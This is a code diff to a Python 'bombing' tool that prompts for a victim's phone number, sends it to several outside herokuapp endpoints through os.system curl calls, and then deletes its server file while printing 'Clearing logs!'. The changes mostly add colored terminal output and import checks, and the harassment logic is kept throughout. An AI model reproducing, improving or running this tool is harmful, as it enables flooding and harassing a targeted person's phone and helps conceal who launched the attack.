@@ -1,17 +1,47 @@
-import os
-import time
-import random
-import datetime
+try:
+    import os
+    print(Fore.RED + 'os' + Fore.WHITE + '       [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+except Exception as e:
+    print(e)
+    print(Fore.RED + "'os' was not found!")
 
+try:
+    from colorama import *
+    print('[!] Checking for Requirements')
+    print(" ")
+    print(Fore.RED + 'Colorama' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+except Exception as e:
+    print(e)
+    print(Fore.RED + "'Colorama' was not found!")
+
+try:
+    import time
+    print(Fore.RED + 'time' + Fore.WHITE + '     [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+except Exception as e:
+    print(e)
+    print(Fore.RED + "'time' was not found!")
+
+try:
+    import random
+    print(Fore.RED + 'random' + Fore.WHITE + '   [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+except Exception as e:
+    print(e)
+try:
+    import datetime
+    print(Fore.RED + 'datetime' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+except Exception as e:
+    print(e)
+
+input('Press enter to continue')
 def startup_time():
     Time=datetime.datetime.now().strftime('%H:%M:%S')
     os.system('clear')
     print(' ')
     print(' ')
-    print('[~]Tool Started at '+Time)
+    print(Fore.WHITE + '[' + '\033[1;32m~' + Fore.WHITE + ']' + Fore.GREEN + 'Tool Started at ' + Fore.CYAN + Time)
 print(startup_time())
 
-number = input('[~]Enter the phone number of victim >_ ')
+number = input(Fore.WHITE + '[' + Fore.GREEN + '~' + Fore.WHITE + '] ' + Fore.GREEN + 'Enter the phone number of victim >_ ')
 
 server1 = (' https://xlr81.herokuapp.com/bomb/'+number)
 server2 = (' https://xlr82.herokuapp.com/bomb/'+number)
@@ -31,23 +61,26 @@ pairs_lst = [pair1, pair2, pair3, pair4, pair5, pair6]
 
 def bombing_time():
     Time=datetime.datetime.now().strftime("%H:%M:%S")
-    print('Bombing started at '+Time)
+    print(Fore.GREEN + 'Bombing started at ' + Fore.RED +Time)
 
 def write_srvers():
     f = open("serverconf.txt", "w")
     l = random.choice(pairs_lst)
     f.writelines(l)
-    print('[!] Bombing from the servers:>')
+    print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + ' Bombing from the servers -->')
+    print(Fore.WHITE + ".")
     print(l)
     f.close()
 
 def read_servers():
     f = open("serverconf.txt", "r")
     os.system("curl"+f.read())
-    print("[!] Clearing logs!")
+    print(" ")
+    print(" ")
+    print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + " Clearing logs!")
     try:
         os.remove("serverconf.txt")
-        print("[✓] Successfully cleared logs!")
+        print(Fore.WHITE + "[" + Fore.GREEN + "✓" + Fore.WHITE + "] " + Fore.GREEN + "Successfully cleared logs!")
     except Exception as e:
         print("✗"+e)
 
@@ -67,15 +100,7 @@ def countdown(t):
     print("Initiating Bombing Servers...")
     bombing_time()
     main()
-#samay = int(input('Enter Sleep Time (0 for no sleep): '))
-#os.system('clear')
-#print('')
-#print('')
-#print('')
-#print('___________Bombing will start in__________')
-#print(samay)
-#time.sleep(samay)
-#print('Initiating Bombing Servers...')
-t = input("[~]Enter Bombing Delay in 'Seconds'(0 for NO DELAY) >_")
-print("[!] Bombing in")
+
+t = input(Fore.WHITE + "[" + Fore.GREEN + "~" + Fore.WHITE + "] " + Fore.GREEN + "Enter Bombing Delay in 'Seconds'(0 for NO DELAY) >_")
+print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + "Bombing in")
 countdown(int(t))
